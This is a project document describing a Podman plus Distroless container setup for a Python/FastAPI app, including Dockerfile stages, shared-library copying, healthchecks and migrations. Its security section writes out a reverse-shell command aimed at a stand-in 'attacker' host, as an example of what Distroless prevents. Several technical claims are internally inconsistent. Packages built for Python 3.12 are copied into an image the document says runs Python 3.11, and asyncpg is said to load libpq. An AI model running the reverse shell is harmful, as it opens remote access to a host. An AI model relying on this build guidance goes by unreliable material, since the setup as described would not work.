# Podman + Distroless — Container Strategy

> **Version:** 1.0 · **Last updated:** 2026-03-17
> **Stack:** Python 3.12 · FastAPI · Podman · gcr.io/distroless/python3-debian12

---

## Table of Contents

1. [Overview](#1-overview)
2. [What Is Podman?](#2-what-is-podman)
3. [What Is Distroless?](#3-what-is-distroless)
4. [How This Project Uses Them](#4-how-this-project-uses-them)
5. [Podman vs Docker — Detailed Comparison](#5-podman-vs-docker--detailed-comparison)
6. [Distroless vs Traditional Base Images — Detailed Comparison](#6-distroless-vs-traditional-base-images--detailed-comparison)
7. [Architecture of the Multi-Stage Dockerfile](#7-architecture-of-the-multi-stage-dockerfile)
8. [Rootless Containers and User Namespace Mapping](#8-rootless-containers-and-user-namespace-mapping)
9. [Shared Library Copying Pattern](#9-shared-library-copying-pattern)
10. [Healthcheck Without curl](#10-healthcheck-without-curl)
11. [Migration Service and the Shell Constraint](#11-migration-service-and-the-shell-constraint)
12. [Day-to-Day Developer Workflow](#12-day-to-day-developer-workflow)
13. [Known Limitations and Workarounds](#13-known-limitations-and-workarounds)
14. [Verification Checklist](#14-verification-checklist)

---

## 1. Overview

This document explains the container strategy used in this project: **Podman** as the container
runtime and **Google Distroless** as the production base image. It describes:

- What each technology is and why it was chosen
- The concrete advantages and disadvantages compared to the classic Docker + `python:3.12-slim` setup
- How the pieces fit together in this specific codebase
- Practical guidance for developers working with this stack

The core idea is a **two-tier approach**:

| Stage | Base Image | Purpose |
|-------|-----------|---------|
| `development` | `python:3.12-slim` | Hot-reload, testing, migrations — needs bash, pip, curl |
| `production` | `gcr.io/distroless/python3-debian12:nonroot` | Minimal runtime — no shell, no apt, ~50 MB |

Both stages are built from the same `Dockerfile` and work identically with Docker or Podman.

---

## 2. What Is Podman?

**Podman** (Pod Manager) is an open-source, OCI-compliant container engine developed by Red Hat.
It is available on Linux, macOS, and Windows, and ships as the default container tool on
RHEL 8+, Fedora, and CentOS Stream.

```
Traditional Docker architecture:

  Developer CLI ──► dockerd (root daemon, always running) ──► runc ──► container
                        ▲
                   listens on /var/run/docker.sock (root socket)

Podman architecture:

  Developer CLI ──────────────────────────────────────────► conmon ──► container
  (no daemon, no socket, no persistent root process)
```

### How It Works

When you run `podman run`, the Podman binary:
1. Resolves the image from a local store or a registry (Docker Hub, GHCR, Quay.io, etc.)
2. Unpacks the OCI image layers
3. Calls `conmon` (a small container monitor process) and `runc`/`crun` to start the container
4. Exits immediately — it is a one-shot CLI invocation, not a long-running daemon

There is no background `dockerd` process. Each container is a child process of the user who
started it, not of a root-owned daemon.

### Key Characteristics

| Property | Value |
|---------|-------|
| Daemon | None (daemonless) |
| Root required | No (rootless by default on modern distros) |
| OCI compatibility | Full — reads/writes Docker-compatible images |
| Compose support | `podman-compose` (pip install podman-compose) |
| Pod concept | Supports multi-container pods (like Kubernetes pods) |
| CLI compatibility | Drop-in replacement — `alias docker=podman` works |
| Image format | OCI (same as Docker) |
| Registry support | Docker Hub, GHCR, Quay.io, ECR, GCR, etc. |

---

## 3. What Is Distroless?

**Distroless** images are produced and maintained by Google. The name is literal: they contain
no Linux _distribution_ tooling. Specifically they strip out:

- Package managers (`apt`, `dpkg`, `rpm`)
- Shells (`bash`, `sh`, `dash`)
- Core utilities (`ls`, `cat`, `curl`, `wget`, `find`, `grep`)
- Build tools (`gcc`, `make`)
- Text editors (`vim`, `nano`)
- Documentation (`/usr/share/doc`, man pages)

What they _do_ contain is the absolute minimum to run a specific language runtime:

- The language interpreter (Python, Java, Go, Node.js, etc.)
- The C standard library (`libc`, `libpthread`, etc.)
- SSL/TLS libraries (`libssl`, `libcrypto`)
- A CA certificate bundle

```
python:3.12-slim content (~130 MB)          gcr.io/distroless/python3-debian12 (~50 MB)
─────────────────────────────────           ──────────────────────────────────────────
/bin/bash          ✓                        /bin/bash                          ✗
/usr/bin/apt       ✓                        /usr/bin/apt                       ✗
/usr/bin/curl      ✓                        /usr/bin/curl                      ✗
python3            ✓                        python3                            ✓
libc.so            ✓                        libc.so                            ✓
libssl.so          ✓                        libssl.so                          ✓
CA certs           ✓                        CA certs                           ✓
OS packages ~800   ✓                        OS packages ~15                    ✓
```

### Distroless Variants Relevant to This Project

| Image | Contents | Use Case |
|-------|---------|---------|
| `gcr.io/distroless/python3-debian12` | Python 3.11 interpreter | Default, runs as root |
| `gcr.io/distroless/python3-debian12:nonroot` | Same + UID 65532 "nonroot" user | Production (this project) |
| `gcr.io/distroless/python3-debian12:debug` | Adds BusyBox shell for debugging | Incident investigation only |

---

## 4. How This Project Uses Them

### Dockerfile Stage Summary

```
Stage 1: base  (python:3.12-slim)
    │  Install libpq5, curl for healthcheck
    │  Set Python environment variables
    │
    ├──► Stage 2: builder  (FROM base)
    │        Install build-essential, libpq-dev, gcc
    │        pip install --prefix=/install .
    │        Produces: /install/  (all Python packages)
    │
    ├──► Stage 3: development  (FROM base)
    │        COPY /install from builder
    │        pip install dev extras (pytest, ruff, mypy, httpx)
    │        useradd app (UID 1001)
    │        CMD: uvicorn --reload
    │        Used by: docker-compose.yml (app service), migrate service
    │
    └──► Stage 4: production  (gcr.io/distroless/python3-debian12:nonroot)
             COPY /install from builder
             COPY libpq.so.5, libssl.so.3, libcrypto.so.3 from base
             COPY src/, migrations/, alembic.ini
             HEALTHCHECK: python3 -c "urllib.request..."
             CMD: uvicorn (exec form, no shell)
             Used by: docker build --target production
```

### File Map

```
facebook-clone/
├── Dockerfile                  ← 4-stage build; stage 4 = Distroless production
├── docker-compose.yml          ← dev stack; userns_mode: keep-id for Podman rootless
├── docker-compose.staging.yml  ← staging overlay; userns_mode: keep-id
├── Makefile                    ← docker-* and podman-* targets
├── .dockerignore               ← original ignore file (Docker reads this)
└── .containerignore            ← Podman-native ignore file (same content)
```

---

## 5. Podman vs Docker — Detailed Comparison

### 5.1 Architecture

#### Docker

Docker uses a **client–server** architecture with a persistent root daemon (`dockerd`).

```
┌──────────────────────────────────────────────────────────────┐
│                      Host OS (Linux)                         │
│                                                              │
│  $ docker run nginx                                          │
│       │                                                      │
│       ▼                                                      │
│  Docker CLI ──Unix socket──► dockerd (root, PID 1 of sorts) │
│                                  │                           │
│                              containerd                      │
│                                  │                           │
│                               runc ──► nginx container       │
└──────────────────────────────────────────────────────────────┘
```

`dockerd` runs continuously, owns all containers, manages images, volumes, and networks.
It listens on `/var/run/docker.sock`, which is owned by `root`.

#### Podman

Podman uses a **fork/exec** model. No daemon.

```
┌──────────────────────────────────────────────────────────────┐
│                      Host OS (Linux)                         │
│                                                              │
│  $ podman run nginx                                          │
│       │                                                      │
│       ▼                                                      │
│  podman binary (runs as current user, then exits)            │
│       │                                                      │
│    conmon + crun ──► nginx container (child of your shell)   │
└──────────────────────────────────────────────────────────────┘
```

---

### 5.2 Security Model

#### Docker Security Concerns

| Risk | Explanation |
|------|------------|
| Root daemon | `dockerd` runs as root. Any exploit in the daemon = root on the host. |
| Docker socket | `/var/run/docker.sock` is effectively a root shell. Mounting it in a container (common in CI) = full host access. |
| Default root containers | Unless you add `USER` to your Dockerfile, containers run as root, and those root processes map to host root. |
| Privilege escalation | `docker run --privileged` or volume mounts can break container isolation. |

#### Podman Security Advantages

| Property | Benefit |
|---------|---------|
| No root daemon | No persistent root process to exploit. A daemon vulnerability cannot escalate to host root. |
| Rootless by default | Containers run as your UID. Container "root" maps to your unprivileged UID on the host via user namespaces. |
| No shared socket | No equivalent of Docker socket. Each user's Podman is isolated. |
| SELinux/seccomp integration | Podman integrates tightly with SELinux labels on RHEL/Fedora for mandatory access control. |
| Rootless networking | Uses `slirp4netns` (user-space network stack) — no root required for port binding above 1024. |

**Practical implication for this project:** When Podman runs the app container as UID 65532
(the Distroless `nonroot` user), that UID maps to your personal host UID via user namespace
mapping. The container cannot escalate to host root even if the application is compromised.

---

### 5.3 Compatibility

Podman is a **drop-in CLI replacement** for Docker:

```bash
# These are equivalent
docker build -t myapp .
podman build -t myapp .

docker run --rm -it myapp bash
podman run --rm -it myapp bash

docker push ghcr.io/org/myapp:latest
podman push ghcr.io/org/myapp:latest
```

Both read the same:
- `Dockerfile` (and `.containerignore` / `.dockerignore`)
- OCI image format (Docker Hub, GHCR, ECR, GCR)
- `docker-compose.yml` (via `podman-compose` or `docker-compose` bridge)

---

### 5.4 Performance

| Metric | Docker | Podman |
|--------|--------|--------|
| Idle daemon RAM | ~50–80 MB (dockerd + containerd) | 0 MB (no daemon) |
| Container startup | Slightly slower (IPC with daemon) | Slightly faster (fork/exec directly) |
| Image build speed | Fast (BuildKit) | Comparable (uses buildah internally) |
| CI resource usage | Higher (daemon always resident) | Lower (Podman starts and exits) |

On a developer laptop, eliminating `dockerd` frees 50–80 MB of RAM permanently. On a CI
runner with 2 GB RAM, this is meaningful.

---

### 5.5 Compose Support

| Tool | Works With |
|------|-----------|
| `docker compose` (v2 plugin) | Docker only |
| `podman-compose` | Podman only |
| `docker-compose` (v1 Python) | Both (connects via socket emulation) |

`podman-compose` reads the exact same `docker-compose.yml` format. The `userns_mode: keep-id`
field is a Podman-specific compose extension that Docker ignores — it is safe to leave in the
file for both runtimes.

---

### 5.6 Disadvantages of Podman vs Docker

| Disadvantage | Detail |
|-------------|--------|
| **Rootless networking** | Port binding below 1024 requires extra config (`net.ipv4.ip_unprivileged_port_start`). Port 8000 is fine; port 80/443 is not. |
| **podman-compose immaturity** | `podman-compose` lags behind `docker compose` in feature coverage. Complex compose features (e.g., `extends`, some health-check options) may behave differently. |
| **macOS/Windows support** | Podman uses a Linux VM (`podman machine`) on macOS and Windows, similar to Docker Desktop. Docker Desktop is more polished and has a GUI. |
| **CI/CD ecosystem** | Most CI tooling (GitHub Actions, CircleCI, etc.) targets Docker by default. Podman works but requires manual setup or the `podmand/podmand` action. |
| **BuildKit features** | Docker's BuildKit has richer `--mount=type=cache` and `--secret` support. Podman's buildah backend is catching up but not 100% equivalent. |
| **Volume permission on macOS** | `userns_mode: keep-id` is Linux-only. On macOS with `podman machine`, volume permissions work differently and may need `:z` or `:Z` SELinux labels. |
| **Ecosystem mindshare** | More tutorials, Stack Overflow answers, and third-party tools target Docker. Debugging Podman-specific issues has fewer resources. |
| **Compose network aliases** | Some DNS resolution nuances between `docker compose` and `podman-compose` can cause subtle differences in service-to-service discovery. |

---

## 6. Distroless vs Traditional Base Images — Detailed Comparison

### 6.1 Image Size

```
Base image comparison (approximate, amd64):

python:3.12          ~1.0 GB   Full Debian — all packages
python:3.12-slim     ~130 MB   Debian slim — fewer packages, still has bash, apt, curl
python:3.12-alpine   ~60 MB    Alpine Linux — musl libc, BusyBox shell
distroless/python3   ~50 MB    No distro tooling at all, glibc
```

Smaller images mean:
- Faster CI builds (less to pull/push)
- Lower registry storage cost
- Faster Kubernetes pod startup (less to pull from registry to node)
- Smaller attack surface (fewer installed files = fewer CVE targets)

---

### 6.2 Security Surface

#### CVE Count Comparison (indicative)

Container security scanners (Trivy, Grype, Snyk) regularly report:

| Image | Typical CVE Count | Notes |
|-------|------------------|-------|
| `python:3.12` | 200–500+ | Full Debian, many packages with known CVEs |
| `python:3.12-slim` | 20–80 | Fewer packages but still has apt, bash, curl |
| `python:3.12-alpine` | 5–20 | Very minimal, but musl libc differences |
| `distroless/python3-debian12` | 0–10 | Google patches continuously; minimal packages |

The absence of a shell is itself a security control. An attacker who achieves code execution
inside a Distroless container cannot:

- Run `bash -i >& /dev/tcp/attacker/4444 0>&1` (no bash)
- Install tools with `apt-get install ncat` (no apt)
- Download exploit payloads with `curl` or `wget` (not present)
- Read/modify files with text editors (not present)
- Enumerate the system with `find`, `ls -la /etc` interactively (no shell)

This does not prevent all attacks — the application code itself can still be exploited — but it
dramatically raises the cost of post-exploitation lateral movement.

---

### 6.3 Debugging Constraints

This is the most significant operational disadvantage of Distroless.

#### With `python:3.12-slim` (traditional)

```bash
# You can exec into the container and investigate freely
docker exec -it app-container bash

root@abc123:/app# ps aux
root@abc123:/app# cat /etc/os-release
root@abc123:/app# pip list
root@abc123:/app# python3 -c "import asyncpg; print(asyncpg.__version__)"
root@abc123:/app# curl http://localhost:8000/health
```

#### With Distroless (this project's production)

```bash
# exec gives you Python, nothing else
podman exec -it app-container python3

# No bash, no shell, no ps, no cat, no curl
# The Python REPL is the only interactive tool
>>> import sys; print(sys.version)
>>> import asyncpg; print(asyncpg.__version__)
```

For production debugging, use the **`:debug` variant** temporarily:

```bash
# Rebuild with the debug tag (adds BusyBox shell)
FROM gcr.io/distroless/python3-debian12:debug AS production-debug
# Then exec with sh (BusyBox, not bash)
podman exec -it app-container sh
```

Never deploy the `:debug` tag permanently — restore `:nonroot` after investigation.

---

### 6.4 Build Complexity

Distroless forces you to be explicit about _everything_ the application needs at runtime.

#### Traditional approach — implicit

```dockerfile
FROM python:3.12-slim
RUN apt-get install -y libpq5   # just works
RUN pip install psycopg2-binary  # pulls its own .so files
```

#### Distroless approach — explicit

```dockerfile
FROM python:3.12-slim AS base
RUN apt-get install -y libpq5   # install in the base/builder

FROM gcr.io/distroless/python3-debian12:nonroot AS production
# Must explicitly copy every .so the app needs at runtime
COPY --from=base /usr/lib/x86_64-linux-gnu/libpq.so.5   /usr/lib/x86_64-linux-gnu/
COPY --from=base /usr/lib/x86_64-linux-gnu/libssl.so.3  /usr/lib/x86_64-linux-gnu/
COPY --from=base /usr/lib/x86_64-linux-gnu/libcrypto.so.3 /usr/lib/x86_64-linux-gnu/
```

If you forget a shared library, the container starts but the application crashes at import time
with `ImportError: libpq.so.5: cannot open shared object file`. You will discover this during
build testing, not in production — but the explicit nature adds initial setup effort.

---

### 6.5 Disadvantages of Distroless vs Traditional Images

| Disadvantage | Detail |
|-------------|--------|
| **No interactive shell** | Cannot `exec -it container bash`. Must use `:debug` variant for incident investigation. |
| **No package installation** | Cannot `apt-get install` at runtime to add missing tools. Must rebuild and redeploy. |
| **Explicit .so dependencies** | All shared libraries must be copied manually in the Dockerfile. Easy to miss one. |
| **Architecture-specific paths** | Library paths like `/usr/lib/x86_64-linux-gnu/` are architecture-specific. Multi-arch builds require conditional logic or `--platform` targeting. |
| **No `useradd`/`mkdir`** | Cannot create users or directories in a `RUN` step. Must use `COPY --chown` and rely on volume mounts for runtime-created dirs. |
| **healthcheck limitations** | Standard curl-based healthchecks don't work. Must use Python, wget (not present), or an external health check mechanism. |
| **Python version coupling** | The Distroless Python version is fixed per image tag. You cannot `pip install` a different Python or use `pyenv`. |
| **Alembic migrations** | Cannot run `alembic upgrade head` in the production container (no shell, no `alembic` CLI in PATH by default without workarounds). Migrations must run in a separate development-stage container. |
| **Log inspection** | No `tail`, `cat`, `grep` — logs must be viewed via the container runtime log interface (`podman logs`, `kubectl logs`). |
| **Steeper learning curve** | Developers unfamiliar with multi-stage builds and shared library management will find it harder to debug build failures. |

---

## 7. Architecture of the Multi-Stage Dockerfile

The Dockerfile uses 4 named stages with specific dependency relationships:

```
                  ┌─────────────────────────────────────┐
                  │  Stage 1: base                      │
                  │  FROM python:3.12-slim               │
                  │                                     │
                  │  • ENV vars (PYTHONDONTWRITEBYTECODE)│
                  │  • apt: libpq5, curl                │
                  │  • Source of runtime .so files      │
                  └──────────────┬──────────────────────┘
                                 │  FROM base
              ┌──────────────────┴──────────────────────┐
              │                                          │
              ▼                                          ▼
  ┌───────────────────────┐              ┌───────────────────────────┐
  │  Stage 2: builder     │              │  Stage 3: development     │
  │  FROM base            │              │  FROM base                │
  │                       │              │                           │
  │  • Build tools        │              │  • COPY /install ◄────────┼──┐
  │    (gcc, libpq-dev)   │              │  • pip install dev extras │  │
  │  • pip install        │              │  • useradd app (1001)     │  │
  │    --prefix=/install  │              │  • uvicorn --reload CMD   │  │
  │                       │              │                           │  │
  │  Produces: /install/  │              │  Used by:                 │  │
  └───────────┬───────────┘              │  • docker-compose.yml     │  │
              │                          │  • migrate service        │  │
              │  COPY /install           └───────────────────────────┘  │
              └────────────────────────────────────────────────────────►┘
              │
              │  COPY /install
              │  COPY .so files from base
              ▼
  ┌───────────────────────────────────────────────────────────────────┐
  │  Stage 4: production                                              │
  │  FROM gcr.io/distroless/python3-debian12:nonroot                  │
  │                                                                   │
  │  • COPY /install (Python packages, no build tools)               │
  │  • COPY libpq.so.5, libssl.so.3, libcrypto.so.3 (from base)     │
  │  • COPY src/, migrations/, alembic.ini                           │
  │  • HEALTHCHECK: python3 urllib.request                           │
  │  • CMD: uvicorn (exec form)                                       │
  │  • Runs as UID 65532 (nonroot, built into Distroless)            │
  │                                                                   │
  │  Used by: make docker-build / make podman-build                  │
  └───────────────────────────────────────────────────────────────────┘
```

### Why Four Stages?

| Reason | Explanation |
|--------|------------|
| **Layer cache efficiency** | `builder` only rebuilds when `pyproject.toml` or `src/` changes — not when you edit non-Python files. |
| **No build tools in runtime** | `gcc`, `libpq-dev`, `build-essential` are in `builder` only. They never reach `production`, reducing image size and CVE surface. |
| **Source of .so files** | `base` installs `libpq5` so `production` can `COPY --from=base` the `.so` files without any `RUN apt-get`. |
| **Separate dev and prod** | `development` keeps `bash`, `curl`, `pytest`, `ruff` for developer convenience. `production` is stripped to the minimum. |

---

## 8. Rootless Containers and User Namespace Mapping

### The Problem

In rootless Podman, your user (e.g., UID 1000 on the host) is mapped inside the container as:

- Container UID 0 (root) → Host UID 1000 (you)
- Container UID 1 → Host sub-UID (e.g., 100001)
- Container UID 65532 → Host sub-UID (e.g., 165532)

When you bind-mount `./uploads:/app/uploads`, the directory on disk is owned by UID 1000 (you).
But inside the container, if the app runs as UID 65532 (nonroot), that maps to a different host UID.
The container process cannot write to the mounted directory, causing `PermissionError`.

### The Solution: `userns_mode: keep-id`

```yaml
# docker-compose.yml
services:
  app:
    userns_mode: keep-id  # Podman: map host UID → container UID 1:1
```

`keep-id` instructs Podman to map your host UID directly as the same UID inside the container.
If you are UID 1000 on the host, you appear as UID 1000 inside the container too — not remapped.
This means files you own on the host are writable inside the container.

### What `keep-id` Does and Does Not Do

| Aspect | Effect |
|--------|--------|
| Volume mounts | Your UID inside container matches your UID on host → bind-mount permissions work correctly |
| Security | You still cannot escalate to host root; user namespaces are still isolated |
| Docker compatibility | Docker silently ignores `userns_mode: keep-id` — safe to leave in `docker-compose.yml` |
| Named volumes (`pgdata`, etc.) | Not affected — Podman manages these volumes internally |

---

## 9. Shared Library Copying Pattern

Distroless images contain the Python interpreter and glibc, but not PostgreSQL client libraries.
`asyncpg` (the async PostgreSQL driver) links against `libpq.so.5` at runtime.

### Why This Is Necessary

```
asyncpg import chain:
  Python import asyncpg
    → loads asyncpg._asyncpg.cpython-312.so
      → dlopen("libpq.so.5")          ← must be present in the container
        → libpq.so.5 links libssl.so.3
          → libssl.so.3 links libcrypto.so.3
```

If any of these `.so` files are missing, Python raises:

```
ImportError: libpq.so.5: cannot open shared object file: No such file or directory
```

### The Copy Commands

```dockerfile
# In the production stage — pull .so files from the base (slim) stage
# which has libpq5 installed via apt-get
COPY --from=base /usr/lib/x86_64-linux-gnu/libpq.so.5     /usr/lib/x86_64-linux-gnu/libpq.so.5
COPY --from=base /usr/lib/x86_64-linux-gnu/libssl.so.3    /usr/lib/x86_64-linux-gnu/libssl.so.3
COPY --from=base /usr/lib/x86_64-linux-gnu/libcrypto.so.3 /usr/lib/x86_64-linux-gnu/libcrypto.so.3
```

### Finding Missing Libraries

If you add a new Python package that requires a system library, find what it needs with:

```bash
# In the builder stage or a dev container
ldd $(python3 -c "import <package>; print(<package>.__file__)")

# Example for asyncpg
ldd $(python3 -c "import asyncpg._asyncpg; print(asyncpg._asyncpg.__file__)")
# Output:
#   libpq.so.5 => /usr/lib/x86_64-linux-gnu/libpq.so.5
#   libssl.so.3 => /usr/lib/x86_64-linux-gnu/libssl.so.3
#   libcrypto.so.3 => /usr/lib/x86_64-linux-gnu/libcrypto.so.3
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6  (already in Distroless)
```

Only copy libraries not already present in Distroless (`libc.so.6`, `libm.so.6`,
`libpthread.so.0`, `libdl.so.2` are already included).

### Architecture Note

The paths `/usr/lib/x86_64-linux-gnu/` are specific to `linux/amd64`. On `linux/arm64`:

```dockerfile
# arm64 equivalent
COPY --from=base /usr/lib/aarch64-linux-gnu/libpq.so.5  /usr/lib/aarch64-linux-gnu/libpq.so.5
```

For multi-arch builds, use `--platform` build arguments and conditional logic, or build
separate images per architecture in CI.

---

## 10. Healthcheck Without curl

Docker/Podman healthchecks run inside the container. The production Distroless container has
no `curl`, `wget`, or `httpie`. The healthcheck uses Python's standard library instead:

```dockerfile
HEALTHCHECK --interval=30s --timeout=10s --start-period=40s --retries=3 \
    CMD ["python3", "-c", \
         "import urllib.request; urllib.request.urlopen('http://localhost:8000/health')"]
```

### How It Works

- `urllib.request.urlopen(url)` opens an HTTP connection to the `/health` endpoint
- If the endpoint returns HTTP 2xx, the function returns successfully → healthcheck passes
- If the endpoint returns HTTP 4xx/5xx or the connection is refused, it raises `urllib.error.URLError` → healthcheck fails (exit code 1)
- `--start-period=40s`: the first 40 seconds of container lifetime are grace period (failures don't count)
- `--retries=3`: three consecutive failures mark the container as unhealthy

### Why Not Use a Separate Health Binary?

Some teams compile a small Go or C binary (`healthcheck`) and `COPY` it into Distroless.
The Python one-liner approach is simpler and has zero additional binary to maintain or patch.

---

## 11. Migration Service and the Shell Constraint

Alembic migrations are run as a one-shot container:

```yaml
# docker-compose.yml
migrate:
  build:
    target: development   # NOT production
  command: ["sh", "-c", "alembic upgrade head"]
```

### Why `development` Target?

`alembic upgrade head` is invoked as `sh -c "alembic upgrade head"` — this requires:
1. `sh` to be present (Distroless has no shell)
2. `alembic` to be in PATH as a CLI entry point (available via pip install)

The `production` Distroless stage has no shell, so `sh -c` would fail with
`exec: "sh": executable file not found in $PATH`.

The `development` stage (based on `python:3.12-slim`) has bash, pip, and all CLI entry points.
Using it for the migration runner is safe because:
- Migration containers never accept external traffic
- They run once and exit (`restart: "no"`)
- They only need database access, not production hardening

### Alternative: Exec Form Alembic

If you want to run migrations from the production image, you would need to invoke
the `alembic` module directly via Python's `-m` flag (no shell required):

```yaml
migrate:
  build:
    target: production
  command: ["python3", "-m", "alembic", "upgrade", "head"]
```

This works because `python3 -m alembic` does not need a shell. However, the `development`
target is preferred here to keep the migration container's tooling consistent with the
development environment where migrations are written and tested.

---

## 12. Day-to-Day Developer Workflow

### Install Podman

```bash
# Ubuntu / Debian
sudo apt-get install -y podman

# Fedora / RHEL / CentOS
sudo dnf install -y podman

# macOS
brew install podman
podman machine init
podman machine start

# Install podman-compose
pip install podman-compose
# or
pipx install podman-compose
```

### Build and Run

```bash
# Using Make targets (recommended)
make podman-build          # build production image
make podman-build-dev      # build development image
make podman-up             # start full stack (detached)
make podman-up-build       # start and rebuild images
make podman-down           # stop and remove volumes

# Or directly
podman build --target production -t facebook-clone:latest .
podman build --target development -t facebook-clone:dev .
podman-compose up -d
```

### Common Operations

```bash
# View logs
make podman-logs
# or
podman-compose logs -f app

# Run migrations
make podman-migrate

# Open shell (development container)
make podman-shell

# Check production image size
make podman-size

# Run tests inside dev container
podman-compose exec app pytest tests/ -v
podman-compose exec app pytest tests/unit/ -v --cov=src/fb
```

### Verify Production Image Has No Shell

```bash
# Build production image
podman build --target production -t facebook-clone:latest .

# This should fail — confirming Distroless has no shell
podman run --rm facebook-clone:latest sh
# Expected: Error: crun: ... exec: "sh": executable file not found

# This should succeed — Python is available
podman run --rm facebook-clone:latest python3 --version
# Python 3.11.x
```

---

## 13. Known Limitations and Workarounds

### L1: Alpine vs Distroless

**Not applicable here**, but worth knowing: `python:3.12-alpine` uses **musl libc** instead
of **glibc**. Many pre-built Python wheels (including `asyncpg`) are compiled against glibc
and will not work on Alpine without recompiling. Distroless is based on Debian and uses glibc,
so all standard wheels work.

### L2: Production Container Cannot Create `/app/uploads`

`RUN mkdir -p uploads` requires a shell. Distroless has none. The `uploads` directory must be
provided via a volume mount:

```yaml
# docker-compose.yml
app:
  volumes:
    - ./uploads:/app/uploads    # host directory auto-created by compose
```

If you deploy to Kubernetes, use an `emptyDir` or `PersistentVolumeClaim`.

### L3: Library Paths Are Architecture-Specific

The `.so` paths (`/usr/lib/x86_64-linux-gnu/`) only work on `linux/amd64`. For `linux/arm64`
(Apple Silicon, AWS Graviton), the paths are `/usr/lib/aarch64-linux-gnu/`.

**Current state:** The Dockerfile targets `linux/amd64`. For multi-arch support, either:
- Add `ARG TARGETARCH` and conditional `COPY` logic
- Use separate CI jobs per architecture with `--platform` flag
- Use `COPY --link` with architecture-specific BuildKit mounts

### L4: `podman-compose` Does Not Support All Compose Features

`podman-compose` does not implement 100% of the Compose specification. Known gaps include:
- `extends:` key in services
- Some `deploy:` sub-keys (relevant for staging overlay)
- `--scale` flag behavior differs

For staging, prefer `podman` directly with `--pod` or use Kubernetes manifests.

### L5: macOS Volume Permissions

On macOS with `podman machine`, `userns_mode: keep-id` is ineffective (Linux-only feature).
Volume permissions on macOS use a different mechanism. Add `:z` labels for SELinux relabeling
if you encounter permission errors on Podman Machine:

```yaml
volumes:
  - ./uploads:/app/uploads:z
```

---

## 14. Verification Checklist

After making any change to the Dockerfile or compose files, verify:

```bash
# 1. Build production image successfully
podman build --target production -t facebook-clone:latest .
# Expected: exit 0, no errors

# 2. Check image size (should be 50–65 MB)
podman images facebook-clone:latest
# Expected: SIZE < 70MB

# 3. Confirm no shell in production image
podman run --rm facebook-clone:latest sh
# Expected: executable file not found error

# 4. Confirm Python works in production image
podman run --rm facebook-clone:latest python3 -c "import asyncpg; print('ok')"
# Expected: ok

# 5. Start full dev stack
podman-compose up -d
# Expected: all services healthy

# 6. Health endpoint responds
curl http://localhost:8000/health
# Expected: {"status": "ok", ...}

# 7. Run migrations
podman-compose run --rm migrate
# Expected: INFO  [alembic.runtime.migration] Running upgrade ... -> ...

# 8. Run full test suite in dev container
podman-compose exec app pytest tests/ -v --cov=src/fb
# Expected: all tests pass, coverage >= 80%

# 9. Verify no shell in running production container (Kubernetes / staging)
podman exec <prod-container-id> bash
# Expected: OCI runtime exec failed
```

---

## Summary Table

| Property | Docker + slim | Podman + Distroless |
|---------|--------------|-------------------|
| Runtime daemon | `dockerd` (root, always on) | None |
| Idle RAM usage | ~50–80 MB | 0 MB |
| Root required | Yes (daemon) | No |
| Production image size | ~130 MB | ~50–65 MB |
| Shell in production | Yes | No |
| OS CVE surface | Medium | Minimal |
| Interactive debugging | Easy (`exec bash`) | Hard (need `:debug` tag) |
| Shared library setup | Automatic (apt) | Manual (COPY .so files) |
| Migration container | Uses `sh -c` naturally | Requires `development` target |
| Multi-arch builds | Straightforward | Library paths need care |
| CI/CD ecosystem | Native support | Needs configuration |
| Developer familiarity | Very high | Medium |
| Compose compatibility | Full | ~90% via podman-compose |
